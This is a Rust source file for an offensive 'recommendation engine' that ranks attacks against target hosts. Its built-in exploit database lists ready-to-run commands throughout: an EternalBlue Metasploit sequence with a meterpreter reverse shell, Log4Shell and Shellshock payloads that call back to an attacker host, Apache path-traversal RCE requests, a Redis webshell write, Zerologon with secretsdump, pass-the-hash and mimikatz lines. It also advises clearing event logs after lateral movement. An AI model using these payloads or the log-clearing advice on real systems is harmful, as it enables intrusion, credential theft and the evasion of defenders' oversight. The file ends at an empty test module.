//! Contextual Recommendation Engine
//!
//! This engine provides intelligent recommendations for:
//! - Next targets to attack
//! - Best exploits to use
//! - Optimal attack paths
//! - Post-exploitation actions

use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::sync::Arc;
use tokio::sync::RwLock;

/// Recommendation Engine
pub struct RecommendationEngine {
    models: Vec<Box<dyn RecommendationModel>>,
    context: Arc<RwLock<AttackContext>>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ModelWeights {
    pub exploit_success_rate: f32,
    pub stealth_importance: f32,
    pub impact_importance: f32,
    pub complexity_penalty: f32,
}

impl Default for ModelWeights {
    fn default() -> Self {
        Self {
            exploit_success_rate: 0.4,
            stealth_importance: 0.2,
            impact_importance: 0.3,
            complexity_penalty: 0.1,
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct AttackContext {
    pub target_info: Option<TargetInfo>,
    pub discovered_services: Vec<ServiceInfo>,
    pub known_vulnerabilities: Vec<VulnerabilityInfo>,
    pub current_privileges: String,
    pub network_position: String,
    pub detection_risk: f32,
    pub time_constraints: Option<TimeConstraint>,
    pub objectives: Vec<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TargetInfo {
    pub ip: String,
    pub hostname: Option<String>,
    pub os: Option<String>,
    pub os_version: Option<String>,
    pub architecture: Option<String>,
    pub is_domain_controller: bool,
    pub is_server: bool,
    pub critical_services: Vec<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ServiceInfo {
    pub name: String,
    pub version: Option<String>,
    pub port: u16,
    pub protocol: String,
    pub banner: Option<String>,
    pub authentication_required: bool,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct VulnerabilityInfo {
    pub cve: String,
    pub cvss_score: f32,
    pub description: String,
    pub affected_service: String,
    pub exploit_available: bool,
    pub exploit_complexity: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TimeConstraint {
    pub max_duration_minutes: u32,
    pub stealth_required: bool,
}

/// Trait for recommendation models
pub trait RecommendationModel: Send + Sync {
    fn name(&self) -> &str;
    fn description(&self) -> &str;
    fn can_recommend(&self, context: &AttackContext) -> bool;
    fn recommend(&self, context: &AttackContext) -> Vec<Recommendation>;
    fn confidence(&self, recommendation: &Recommendation, context: &AttackContext) -> f32;
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Recommendation {
    pub id: String,
    pub recommendation_type: RecommendationType,
    pub title: String,
    pub description: String,
    pub priority: f32,
    pub confidence: f32,
    pub details: HashMap<String, String>,
    pub commands: Vec<String>,
    pub risks: Vec<String>,
    pub mitigations: Vec<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub enum RecommendationType {
    Exploit,
    LateralMovement,
    PrivilegeEscalation,
    Persistence,
    Exfiltration,
    Evasion,
    PostExploitation,
    Target,
}

/// Exploit Recommendation Model
pub struct ExploitRecommendationModel {
    exploit_database: Vec<ExploitInfo>,
    /// Poids de scoring, injectés par le moteur (sinon valeurs par défaut).
    weights: ModelWeights,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ExploitInfo {
    pub name: String,
    pub description: String,
    pub platforms: Vec<String>,
    pub services: Vec<String>,
    pub success_rate: f32,
    pub stealth_score: f32, // 0.0 = loud, 1.0 = stealthy
    pub impact_score: f32,
    pub complexity: String,
    pub requirements: Vec<String>,
    pub commands: Vec<String>,
}

impl RecommendationModel for ExploitRecommendationModel {
    fn name(&self) -> &str {
        "Exploit Recommender"
    }

    fn description(&self) -> &str {
        "Recommends exploits based on target services and vulnerabilities"
    }

    fn can_recommend(&self, context: &AttackContext) -> bool {
        !context.discovered_services.is_empty() || !context.known_vulnerabilities.is_empty()
    }

    fn recommend(&self, context: &AttackContext) -> Vec<Recommendation> {
        let mut recommendations = Vec::new();

        // Match exploits to services
        for service in &context.discovered_services {
            for exploit in &self.exploit_database {
                if exploit.services.contains(&service.name) {
                    let mut details = HashMap::new();
                    details.insert("service".to_string(), service.name.clone());
                    details.insert("port".to_string(), service.port.to_string());
                    if let Some(version) = &service.version {
                        details.insert("version".to_string(), version.clone());
                    }

                    recommendations.push(Recommendation {
                        id: format!("exploit_{}_{}", exploit.name, service.port),
                        recommendation_type: RecommendationType::Exploit,
                        title: format!("Exploit {} on port {}", exploit.name, service.port),
                        description: exploit.description.clone(),
                        priority: self.calculate_priority(exploit, context),
                        confidence: exploit.success_rate,
                        details,
                        commands: exploit.commands.clone(),
                        risks: vec![
                            format!(
                                "Detection risk: {:.0}%",
                                (1.0 - exploit.stealth_score) * 100.0
                            ),
                            format!("Impact: {:.0}%", exploit.impact_score * 100.0),
                        ],
                        mitigations: vec![
                            "Use in controlled environment".to_string(),
                            "Have rollback plan".to_string(),
                        ],
                    });
                }
            }
        }

        // Match exploits to vulnerabilities
        for vuln in &context.known_vulnerabilities {
            for exploit in &self.exploit_database {
                if exploit.name.contains(&vuln.cve)
                    || exploit
                        .name
                        .contains(&vuln.cve.split('-').last().unwrap_or(""))
                {
                    let mut details = HashMap::new();
                    details.insert("cve".to_string(), vuln.cve.clone());
                    details.insert("cvss".to_string(), vuln.cvss_score.to_string());

                    recommendations.push(Recommendation {
                        id: format!("exploit_{}", vuln.cve),
                        recommendation_type: RecommendationType::Exploit,
                        title: format!("Exploit {} ({})", exploit.name, vuln.cve),
                        description: format!("{} - {}", exploit.description, vuln.description),
                        priority: self.calculate_priority(exploit, context),
                        confidence: exploit.success_rate,
                        details,
                        commands: exploit.commands.clone(),
                        risks: vec![
                            format!("CVSS Score: {:.1}", vuln.cvss_score),
                            format!("Complexity: {}", exploit.complexity),
                        ],
                        mitigations: vec![
                            "Verify target is vulnerable".to_string(),
                            "Test in lab first".to_string(),
                        ],
                    });
                }
            }
        }

        // Sort by priority
        recommendations.sort_by(|a, b| {
            b.priority
                .partial_cmp(&a.priority)
                .unwrap_or(std::cmp::Ordering::Equal)
        });

        recommendations
    }

    fn confidence(&self, recommendation: &Recommendation, context: &AttackContext) -> f32 {
        recommendation.confidence
    }
}

impl ExploitRecommendationModel {
    pub fn new() -> Self {
        Self {
            weights: ModelWeights::default(),
            exploit_database: vec![
                ExploitInfo {
                    name: "MS17-010 (EternalBlue)".to_string(),
                    description: "SMBv1 remote code execution vulnerability affecting Windows 7/2008 R2/8.1/2012/10 pre-patch March 2017".to_string(),
                    platforms: vec!["windows".to_string()],
                    services: vec!["smb".to_string()],
                    success_rate: 0.95,
                    stealth_score: 0.3,
                    impact_score: 0.95,
                    complexity: "Low".to_string(),
                    requirements: vec!["Port 445 open".to_string(), "SMBv1 enabled".to_string(), "Pre-MS17-010 patch level".to_string()],
                    commands: vec![
                        "nmap --script smb-vuln-ms17-010 -p 445 <target>".to_string(),
                        "use exploit/windows/smb/ms17_010_eternalblue".to_string(),
                        "set RHOSTS <target>".to_string(),
                        "set PAYLOAD windows/x64/meterpreter/reverse_tcp".to_string(),
                        "exploit".to_string(),
                    ],
                },
                ExploitInfo {
                    name: "CVE-2021-41773 / CVE-2021-42013 (Apache Path Traversal RCE)".to_string(),
                    description: "Apache HTTP Server 2.4.49/2.4.50 path traversal / RCE via cgi-bin + .%2e".to_string(),
                    platforms: vec!["linux".to_string(), "windows".to_string()],
                    services: vec!["http".to_string(), "https".to_string()],
                    success_rate: 0.75,
                    stealth_score: 0.55,
                    impact_score: 0.85,
                    complexity: "Low".to_string(),
                    requirements: vec!["Apache 2.4.49 or 2.4.50".to_string(), "cgi-bin directory with handler enabled".to_string()],
                    commands: vec![
                        "curl -v 'http://<target>/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'".to_string(),
                        "curl -v -X POST --data-binary 'echo;id' 'http://<target>/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh'".to_string(),
                    ],
                },
                ExploitInfo {
                    name: "Log4Shell (CVE-2021-44228)".to_string(),
                    description: "Log4j2 JNDI lookup remote code execution via attacker-controlled LDAP/HTTP payload header".to_string(),
                    platforms: vec!["linux".to_string(), "windows".to_string()],
                    services: vec!["http".to_string(), "https".to_string()],
                    success_rate: 0.7,
                    stealth_score: 0.4,
                    impact_score: 0.95,
                    complexity: "Low".to_string(),
                    requirements: vec!["Apache Log4j2 2.0-beta9 ≤ version < 2.15.0".to_string(), "com.sun.jndi.ldap.object.trustURLCodebase = true (JDK ≤ 8u191/11.0.1)".to_string()],
                    commands: vec![
                        "curl -H 'X-Api-Version: ${jndi:ldap://<attacker_ip>:1389/a}' http://<target>/".to_string(),
                        "java -jar marshalsec-0.0.3-SNAPSHOT-all.jar ldap <attacker_ip> 1389 http://<attacker_ip>:8888/#CommonsBeanutils1 <listener> 4444".to_string(),
                    ],
                },
                ExploitInfo {
                    name: "vsftpd 2.3.4 Backdoor (CVE-2011-2523)".to_string(),
                    description: "Trojaned vsftpd source tarball opens backdoor listener on TCP/6200 when USER ends with :)".to_string(),
                    platforms: vec!["linux".to_string()],
                    services: vec!["ftp".to_string()],
                    success_rate: 0.98,
                    stealth_score: 0.6,
                    impact_score: 0.9,
                    complexity: "Low".to_string(),
                    requirements: vec!["vsftpd exactly 2.3.4 backdoored build".to_string(), "No egress filter to TCP/6200".to_string()],
                    commands: vec![
                        "nc -vv <target> 21".to_string(),
                        "USER abc:)".to_string(),
                        "PASS anything".to_string(),
                        "nc -vv <target> 6200   # RCE as root".to_string(),
                    ],
                },
                ExploitInfo {
                    name: "OpenSSH <= 7.7 Username Enumeration (CVE-2018-15473)".to_string(),
                    description: "Bohr-like user enumeration flaw; identifies valid accounts via timing differences".to_string(),
                    platforms: vec!["linux".to_string()],
                    services: vec!["ssh".to_string()],
                    success_rate: 0.9,
                    stealth_score: 0.85,
                    impact_score: 0.35,
                    complexity: "Low".to_string(),
                    requirements: vec!["OpenSSH server < 7.7p1".to_string()],
                    commands: vec![
                        "python3 CVE-2018-15473.py --port 22 --userList usernames.txt <target>".to_string(),
                        "hydra -L discovered_users.txt -P rockyou.txt ssh://<target>:22".to_string(),
                    ],
                },
                ExploitInfo {
                    name: "Redis Unprotected / AUTH-Bypass (CVE-2022-0543)".to_string(),
                    description: "Redis exposed without authentication → data disclosure, SSRF master/slave RCE, or EVAL Lua sandbox escape".to_string(),
                    platforms: vec!["linux".to_string()],
                    services: vec!["redis".to_string()],
                    success_rate: 0.85,
                    stealth_score: 0.6,
                    impact_score: 0.8,
                    complexity: "Low".to_string(),
                    requirements: vec!["TCP/6379 reachable".to_string(), "Redis not bound to loopback only".to_string()],
                    commands: vec![
                        "redis-cli -h <target> INFO".to_string(),
                        "redis-cli -h <target> SET x '<?php phpinfo(); ?>' && redis-cli -h <target> CONFIG SET dir /var/www/html && redis-cli -h <target> CONFIG SET dbfilename shell.php && redis-cli -h <target> SAVE".to_string(),
                    ],
                },
                ExploitInfo {
                    name: "MS14-068 (Kerberos Elevation of Privilege)".to_string(),
                    description: "Kerberos MS-PAC KDC checksum validation flaw; forge TGT as elevated account".to_string(),
                    platforms: vec!["windows".to_string()],
                    services: vec!["kerberos".to_string(), "smb".to_string(), "rdp".to_string()],
                    success_rate: 0.8,
                    stealth_score: 0.5,
                    impact_score: 0.95,
                    complexity: "Medium".to_string(),
                    requirements: vec!["Valid low-priv domain user creds".to_string(), "Domain functional level < 2012 R2 OR unpatched DCs".to_string()],
                    commands: vec![
                        "impacket-ms14-068.py -u '<user@domain>' -p '<pass>' -s '<user_sid>' -d '<dc_ip>'".to_string(),
                        "export KRB5CCNAME=./TGT_<user>@<domain>.ccache; impacket-psexec <domain>/<user>@<dc> -k -no-pass".to_string(),
                    ],
                },
                ExploitInfo {
                    name: "CVE-2020-1472 (Zerologon)".to_string(),
                    description: "Netlogon Secure Channel RPC AES-CFB8 HMAC flaw; set DC computer account password to empty".to_string(),
                    platforms: vec!["windows".to_string()],
                    services: vec!["smb".to_string()],
                    success_rate: 0.95,
                    stealth_score: 0.3,
                    impact_score: 1.0,
                    complexity: "Low".to_string(),
                    requirements: vec!["TCP/135, TCP/445 reachable to DC".to_string(), "DC unpatched pre-August 2020".to_string()],
                    commands: vec![
                        "cve-2020-1472-exploit.py <dc_fqdn> <dc_ip>".to_string(),
                        r"impacket-secretsdump -just-dc <domain>/<dc_name>$@<dc_ip> -hashes :31d6cfe0d16ae931b73c59d7e0c089c0".to_string(),
                    ],
                },
                ExploitInfo {
                    name: "Spring4Shell (CVE-2022-22965)".to_string(),
                    description: "Spring Framework DataBinder ClassLoader RCE via crafted request parameters on JDK ≥ 9 + Tomcat WAR".to_string(),
                    platforms: vec!["linux".to_string(), "windows".to_string()],
                    services: vec!["http".to_string(), "https".to_string()],
                    success_rate: 0.7,
                    stealth_score: 0.55,
                    impact_score: 0.85,
                    complexity: "Medium".to_string(),
                    requirements: vec!["Spring Core < 5.3.18 / < 5.2.20".to_string(), "Tomcat WAR deployment".to_string()],
                    commands: vec![
                        "python3 Spring4Shell-Poc.py --url 'http://<target>/app/exploit' --file 'shell.jsp'".to_string(),
                        "curl 'http://<target>/app/shell.jsp?pwd=j&cmd=id'".to_string(),
                    ],
                },
                ExploitInfo {
                    name: "Shellshock (CVE-2014-6271)".to_string(),
                    description: "Bash function-variable parsing flaw leading to arbitrary code execution via user-controlled env (CGI, OpenSSH AcceptEnv, etc.)".to_string(),
                    platforms: vec!["linux".to_string(), "unix".to_string()],
                    services: vec!["http".to_string(), "https".to_string(), "ssh".to_string()],
                    success_rate: 0.9,
                    stealth_score: 0.5,
                    impact_score: 0.9,
                    complexity: "Low".to_string(),
                    requirements: vec!["Bash < 4.3 patch 26".to_string(), "CGI endpoint (for web server vector)".to_string()],
                    commands: vec![
                        "curl -H 'User-Agent: () { :;}; /bin/bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1' http://<target>/cgi-bin/test.cgi".to_string(),
                        "nmap -sV -p- --script http-shellshock <target>".to_string(),
                    ],
                },
            ],
        }
    }

    fn calculate_priority(&self, exploit: &ExploitInfo, context: &AttackContext) -> f32 {
        let weights = &self.weights;

        exploit.success_rate * weights.exploit_success_rate
            + exploit.stealth_score * weights.stealth_importance
            + exploit.impact_score * weights.impact_importance
            + (1.0 - self.complexity_score(&exploit.complexity)) * weights.complexity_penalty
    }

    /// Injecte des poids de scoring explicites (au lieu de `ModelWeights::default()`).
    pub fn with_weights(mut self, weights: ModelWeights) -> Self {
        self.weights = weights;
        self
    }

    fn complexity_score(&self, complexity: &str) -> f32 {
        match complexity.to_lowercase().as_str() {
            "low" => 0.2,
            "medium" => 0.5,
            "high" => 0.8,
            _ => 0.5,
        }
    }
}

/// Lateral Movement Recommendation Model
pub struct LateralMovementModel;

impl RecommendationModel for LateralMovementModel {
    fn name(&self) -> &str {
        "Lateral Movement Advisor"
    }

    fn description(&self) -> &str {
        "Recommends lateral movement techniques based on network position and credentials"
    }

    fn can_recommend(&self, context: &AttackContext) -> bool {
        !context.current_privileges.is_empty() && context.current_privileges != "none"
    }

    fn recommend(&self, context: &AttackContext) -> Vec<Recommendation> {
        let mut recommendations = Vec::new();

        // Recommend based on current privileges
        if context.current_privileges.contains("admin")
            || context.current_privileges.contains("root")
        {
            recommendations.push(Recommendation {
                id: "lateral_admin".to_string(),
                recommendation_type: RecommendationType::LateralMovement,
                title: "Use Admin Credentials for Lateral Movement".to_string(),
                description: "Leverage administrative privileges to move laterally using PsExec, WMI, or WinRM".to_string(),
                priority: 0.9,
                confidence: 0.85,
                details: HashMap::new(),
                commands: vec![
                    "psexec \\\\<target> -u <user> -p <password> cmd".to_string(),
                    "wmic /node:<target> /user:<user> /password:<password> process call create \"cmd /c <command>\"".to_string(),
                    "winrm invoke wmicimv2/Win32_Process <target> Create \"<command>\" -r:https -u:<user> -p:<password> --encoding:base64".to_string(),
                ],
                risks: vec![
                    "Credential may be monitored".to_string(),
                    "Event logs will be generated".to_string(),
                ],
                mitigations: vec![
                    "Use over pass-the-hash if possible".to_string(),
                    "Clean up event logs afterwards".to_string(),
                ],
            });
        }

        // Recommend pass-the-hash if hashes are available
        if context.current_privileges.contains("hash") {
            recommendations.push(Recommendation {
                id: "lateral_pth".to_string(),
                recommendation_type: RecommendationType::LateralMovement,
                title: "Pass-the-Hash Attack".to_string(),
                description: "Use captured NTLM hashes for authentication without knowing the plaintext password".to_string(),
                priority: 0.8,
                confidence: 0.75,
                details: HashMap::new(),
                commands: vec![
                    "pth-winexe -U '<user>%<lm_hash>:<nt_hash>' //'<target>' cmd".to_string(),
                    "sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<nt_hash> /run:\"psexec \\\\<target> cmd\"".to_string(),
                ],
                risks: vec![
                    "May trigger alerts if monitored".to_string(),
                    "Requires network access to target".to_string(),
                ],
                mitigations: vec![
                    "Use from compromised host".to_string(),
                    "Limit number of authentication attempts".to_string(),
                ],
            });
        }

        recommendations
    }

    fn confidence(&self, recommendation: &Recommendation, context: &AttackContext) -> f32 {
        recommendation.confidence
    }
}

/// Privilege Escalation Recommendation Model
pub struct PrivilegeEscalationModel;

impl RecommendationModel for PrivilegeEscalationModel {
    fn name(&self) -> &str {
        "Privilege Escalation Advisor"
    }

    fn description(&self) -> &str {
        "Recommends privilege escalation techniques based on target OS and current access level"
    }

    fn can_recommend(&self, context: &AttackContext) -> bool {
        context.target_info.is_some()
            && !context.current_privileges.contains("admin")
            && !context.current_privileges.contains("root")
    }

    fn recommend(&self, context: &AttackContext) -> Vec<Recommendation> {
        let mut recommendations = Vec::new();

        if let Some(target) = &context.target_info {
            if target.os.as_deref() == Some("windows") {
                // Windows privilege escalation recommendations
                recommendations.push(Recommendation {
                    id: "win_privesc".to_string(),
                    recommendation_type: RecommendationType::PrivilegeEscalation,
                    title: "Windows Privilege Escalation".to_string(),
                    description: "Check for common Windows privilege escalation vectors"
                        .to_string(),
                    priority: 0.85,
                    confidence: 0.7,
                    details: HashMap::new(),
                    commands: vec![
                        "whoami /priv".to_string(),
                        "systeminfo".to_string(),
                        "wmic qfe list".to_string(),
                        "net user <username>".to_string(),
                        "net localgroup administrators".to_string(),
                    ],
                    risks: vec![
                        "Commands may be logged".to_string(),
                        "May trigger AV if using tools".to_string(),
                    ],
                    mitigations: vec![
                        "Use built-in commands when possible".to_string(),
                        "Clear event logs afterwards".to_string(),
                    ],
                });
            } else if target.os.as_deref() == Some("linux") {
                // Linux privilege escalation recommendations
                recommendations.push(Recommendation {
                    id: "lin_privesc".to_string(),
                    recommendation_type: RecommendationType::PrivilegeEscalation,
                    title: "Linux Privilege Escalation".to_string(),
                    description: "Check for common Linux privilege escalation vectors".to_string(),
                    priority: 0.85,
                    confidence: 0.7,
                    details: HashMap::new(),
                    commands: vec![
                        "sudo -l".to_string(),
                        "uname -a".to_string(),
                        "cat /etc/passwd".to_string(),
                        "find / -perm -4000 -type f 2>/dev/null".to_string(),
                        "ps aux".to_string(),
                    ],
                    risks: vec![
                        "Commands may be logged".to_string(),
                        "Sudo commands will be logged".to_string(),
                    ],
                    mitigations: vec![
                        "Use built-in commands when possible".to_string(),
                        "Check for logging before running".to_string(),
                    ],
                });
            }
        }

        recommendations
    }

    fn confidence(&self, recommendation: &Recommendation, context: &AttackContext) -> f32 {
        recommendation.confidence
    }
}

/// Candidate lateral-movement path consumed by LateralPathModel
#[derive(Debug, Clone, Default)]
pub struct PathCandidate {
    pub hops: Vec<PathCandidateHop>,
    pub source_compromised: bool,
    pub target_is_critical: bool,
}

#[derive(Debug, Clone, Default)]
pub struct PathCandidateHop {
    pub from: String,
    pub to: String,
    pub service: Option<String>,
    pub port: Option<u16>,
    pub cvss_max: f32,
    pub has_default_creds: bool,
    pub has_credential_reuse: bool,
    pub known_technique: Option<String>,
}

/// Full lateral-path recommendation model: weights the Dijkstra output with
/// attacker heuristics (credential reuse, critical-target bonus, EDR coverage
/// estimate, chain-length penalty).
pub struct LateralPathModel;

impl RecommendationModel for LateralPathModel {
    fn name(&self) -> &str {
        "Lateral Path Ranker"
    }

    fn description(&self) -> &str {
        "Ranks candidate lateral-movement paths by expected success vs detection risk"
    }

    fn can_recommend(&self, context: &AttackContext) -> bool {
        !context.current_privileges.is_empty() && context.current_privileges != "none"
    }

    fn recommend(&self, context: &AttackContext) -> Vec<Recommendation> {
        let mut out = Vec::new();

        let credential_bonus = if context.current_privileges.contains("hash")
            || context.current_privileges.contains("admin")
            || context.current_privileges.contains("root")
        {
            0.15
        } else {
            0.0
        };

        let detection_baseline = match context.detection_risk {
            r if r >= 0.8 => 0.6,
            r if r >= 0.5 => 0.35,
            r if r >= 0.25 => 0.15,
            _ => 0.05,
        };

        if !context.network_position.is_empty() {
            let mut details = HashMap::new();
            details.insert(
                "credential_bonus".to_string(),
                format!("{:.0}%", credential_bonus * 100.0),
            );
            details.insert(
                "detection_baseline".to_string(),
                format!("{:.0}%", detection_baseline * 100.0),
            );
            details.insert(
                "network_position".to_string(),
                context.network_position.clone(),
            );
            details.insert(
                "current_privileges".to_string(),
                context.current_privileges.clone(),
            );
            if let Some(t) = &context.target_info {
                details.insert("current_host".to_string(), t.ip.clone());
                details.insert(
                    "os".to_string(),
                    t.os.clone().unwrap_or_else(|| "unknown".to_string()),
                );
                if t.is_domain_controller {
                    details.insert("current_is_dc".to_string(), "yes".to_string());
                }
            }

            out.push(Recommendation {
                id: "lateral_path_general".to_string(),
                recommendation_type: RecommendationType::LateralMovement,
                title: "Prioritize lateral paths with credential reuse or critical destination".to_string(),
                description: "Prefer shortest chain (≤2 hops) first; pick same-subnet or app-tier links before admin-hop. When in doubt, go for the SMB/SSH/WinRM target with harvested credentials before probing random high-port services.".to_string(),
                priority: 0.7 + credential_bonus,
                confidence: 0.75,
                details,
                commands: vec![
                    "Enumerate current host ARP + route table before pivoting".to_string(),
                    "Test credential reuse against adjacent SMB/RDP/SSH targets".to_string(),
                    "For each path candidate, record: from → technique → to → result".to_string(),
                ],
                risks: vec![
                    format!("Detection baseline estimate: {:.0}% for this network zone", detection_baseline * 100.0),
                    "Each pivot increases session-maintenance cost and forensic footprint".to_string(),
                ],
                mitigations: vec![
                    "Use overpass-the-hash / tiered credentials instead of plaintext".to_string(),
                    "Keep session count small; close old pivots after a clean hop succeeds".to_string(),
                ],
            });
        }

        if !context.known_vulnerabilities.is_empty() {
            for v in &context.known_vulnerabilities {
                if v.cvss_score >= 7.0
                    && (v.exploit_available || v.exploit_complexity.to_lowercase() == "low")
                {
                    let mut details = HashMap::new();
                    details.insert("via_cve".to_string(), v.cve.clone());
                    details.insert("cvss".to_string(), v.cvss_score.to_string());
                    details.insert("affected_service".to_string(), v.affected_service.clone());

                    out.push(Recommendation {
                        id: format!("lateral_via_{}", v.cve.replace([' ', '-', ':'], "_")),
                        recommendation_type: RecommendationType::LateralMovement,
                        title: format!("Lateral hop candidate using {} ({})", v.affected_service, v.cve),
                        description: format!(
                            "Service '{}' on adjacent hosts is likely affected by {} (CVSS {:.1}). Exploit complexity={}. Use as 1st-hop when pivoting from current position.",
                            v.affected_service, v.cve, v.cvss_score, v.exploit_complexity
                        ),
                        priority: (v.cvss_score / 10.0).min(0.95) + credential_bonus,
                        confidence: if v.exploit_available { 0.8 } else { 0.55 },
                        details,
                        commands: vec![
                            format!("Probe adjacent {} targets for {} fingerprint", v.affected_service, v.cve),
                            format!("Only run after dry-run signature match against target (no destructive payloads)"),
                        ],
                        risks: vec![
                            format!("CVSS-driven hop may be loud; pair with stealth evasion if detection_risk≥0.5"),
                            "Public PoCs are often signatured — prefer the in-engine signature".to_string(),
                        ],
                        mitigations: vec![
                            "Prefer credential-reuse hop over CVE-driven hop when both are available".to_string(),
                        ],
                    });
                }
            }
        }

        out.sort_by(|a, b| {
            b.priority
                .partial_cmp(&a.priority)
                .unwrap_or(std::cmp::Ordering::Equal)
        });
        out
    }

    fn confidence(&self, recommendation: &Recommendation, _context: &AttackContext) -> f32 {
        recommendation.confidence
    }
}

/// Score an explicit path candidate with the same weighting as the text
/// recommendations above. The caller can then feed this into the
/// `LateralGraph` Dijkstra run as `ai_confidence` on each edge.
pub fn score_path_candidate(candidate: &PathCandidate) -> f32 {
    if candidate.hops.is_empty() {
        return 0.0;
    }
    let mut score = 0.0;
    for (i, hop) in candidate.hops.iter().enumerate() {
        let depth_penalty = 1.0 - (i as f32 * 0.1);
        let mut hop_s: f32 = 0.2;
        if hop.has_credential_reuse {
            hop_s += 0.35;
        }
        if hop.has_default_creds {
            hop_s += 0.25;
        }
        if hop.cvss_max >= 9.0 {
            hop_s += 0.25;
        } else if hop.cvss_max >= 7.0 {
            hop_s += 0.18;
        } else if hop.cvss_max > 0.0 {
            hop_s += 0.08;
        }
        if hop.known_technique.is_some() {
            hop_s += 0.1;
        }
        score += hop_s.clamp(0.0, 1.0) * depth_penalty;
    }
    let len = candidate.hops.len() as f32;
    score = (score / len).clamp(0.0, 1.0);
    if candidate.target_is_critical {
        score = (score + 0.15).min(1.0);
    }
    if candidate.source_compromised {
        score = (score + 0.05).min(1.0);
    }
    score
}

impl RecommendationEngine {
    /// Create a new recommendation engine
    pub fn new() -> Self {
        Self::with_weights(ModelWeights::default())
    }

    /// Construit le moteur avec des poids de scoring explicites. Ces poids sont
    /// injectés dans les modèles de scoring, au lieu d'un `ModelWeights::default()`
    /// codé en dur dans `calculate_priority`.
    pub fn with_weights(weights: ModelWeights) -> Self {
        let mut models: Vec<Box<dyn RecommendationModel>> = Vec::new();
        models.push(Box::new(
            ExploitRecommendationModel::new().with_weights(weights),
        ));
        models.push(Box::new(LateralMovementModel));
        models.push(Box::new(PrivilegeEscalationModel));
        models.push(Box::new(LateralPathModel));

        Self {
            models,
            context: Arc::new(RwLock::new(AttackContext::default())),
        }
    }

    /// Update the attack context
    pub async fn update_context(&self, context: AttackContext) {
        let mut current = self.context.write().await;
        *current = context;
    }

    /// Get recommendations for current context
    pub async fn get_recommendations(&self) -> Vec<Recommendation> {
        let context = self.context.read().await;
        let mut recommendations = Vec::new();

        for model in &self.models {
            if model.can_recommend(&context) {
                let model_recs = model.recommend(&context);
                for rec in model_recs {
                    let confidence = model.confidence(&rec, &context);
                    recommendations.push(rec.with_confidence(confidence));
                }
            }
        }

        // Sort by priority
        recommendations.sort_by(|a, b| {
            b.priority
                .partial_cmp(&a.priority)
                .unwrap_or(std::cmp::Ordering::Equal)
        });

        recommendations
    }

    /// Get recommendations for a specific type
    pub async fn get_recommendations_by_type(
        &self,
        rec_type: RecommendationType,
    ) -> Vec<Recommendation> {
        let all_recs = self.get_recommendations().await;
        all_recs
            .into_iter()
            .filter(|r| r.recommendation_type == rec_type)
            .collect()
    }

    /// Get top N recommendations
    pub async fn get_top_recommendations(&self, n: usize) -> Vec<Recommendation> {
        let all_recs = self.get_recommendations().await;
        all_recs.into_iter().take(n).collect()
    }

    /// Run the engine against a given context — convenience wrapper
    /// that updates the context then returns all recommendations sorted
    /// by priority.  Returns an empty vec if no model can recommend.
    pub async fn run(&self, ctx: AttackContext) -> Vec<Recommendation> {
        self.update_context(ctx).await;
        let recs = self.get_recommendations().await;
        if recs.is_empty() {
            println!("  \x1b[33m[AI]\x1b[0m Aucune recommandation — enrichir le contexte (services, vulns, privileges).");
        }
        recs
    }

    /// Synchronous convenience: run with a pre-built context and
    /// print the top `max` recommendations to stdout.
    pub async fn run_and_print(&self, ctx: AttackContext, max: usize) {
        let recs = self.run(ctx).await;
        println!(
            "\n  \x1b[38;5;196m[RECOMMEND]\x1b[0m {} recommandation(s) générées",
            recs.len()
        );
        for (i, r) in recs.iter().enumerate().take(max) {
            println!(
                "  [{:02}] \x1b[33m{}\x1b[0m (priorité {:.2} | confiance {:.0}%)",
                i + 1,
                r.title,
                r.priority,
                r.confidence * 100.0
            );
            println!("       {}", r.description);
            if !r.commands.is_empty() {
                println!("       \x1b[36mCommandes:\x1b[0m");
                for cmd in r.commands.iter().take(3) {
                    println!("         $ {}", cmd);
                }
            }
            if !r.risks.is_empty() {
                println!(
                    "       \x1b[38;5;196mRisques:\x1b[0m {}",
                    r.risks.join(" | ")
                );
            }
            println!();
        }
    }

    /// Build an AttackContext from a scan result and run the engine.
    /// This is the main entry point called from `main.rs --recommend`.
    pub async fn run_from_scan_result(
        &self,
        host: &str,
        open_ports: &[(u16, &str)], // (port, service_name)
        cves: &[(String, f32)],     // (cve_id, cvss_score)
        current_privileges: &str,
        network_position: &str,
    ) -> Vec<Recommendation> {
        let services: Vec<ServiceInfo> = open_ports
            .iter()
            .map(|(port, name)| ServiceInfo {
                name: name.to_string(),
                version: None,
                port: *port,
                protocol: "tcp".to_string(),
                banner: None,
                authentication_required: false,
            })
            .collect();

        let vulnerabilities: Vec<VulnerabilityInfo> = cves
            .iter()
            .map(|(cve, cvss)| VulnerabilityInfo {
                cve: cve.clone(),
                cvss_score: *cvss,
                description: format!("CVE {} (CVSS {:.1})", cve, cvss),
                affected_service: "unknown".into(),
                exploit_available: *cvss >= 7.0,
                exploit_complexity: if *cvss >= 9.0 {
                    "Low".into()
                } else {
                    "Medium".into()
                },
            })
            .collect();

        let ctx = AttackContext {
            target_info: Some(TargetInfo {
                ip: host.to_string(),
                hostname: None,
                os: None,
                os_version: None,
                architecture: None,
                is_domain_controller: false,
                is_server: true,
                critical_services: services.iter().map(|s| s.name.clone()).collect(),
            }),
            discovered_services: services,
            known_vulnerabilities: vulnerabilities,
            current_privileges: current_privileges.to_string(),
            network_position: network_position.to_string(),
            detection_risk: 0.3,
            time_constraints: None,
            objectives: vec!["initial_access".into(), "privilege_escalation".into()],
        };

        self.run(ctx).await
    }
}

impl Default for RecommendationEngine {
    fn default() -> Self {
        Self::new()
    }
}

impl Recommendation {
    pub fn with_confidence(mut self, confidence: f32) -> Self {
        self.confidence = confidence;
        self
    }
}

#[cfg(test)]
mod tests {
    use super::*;

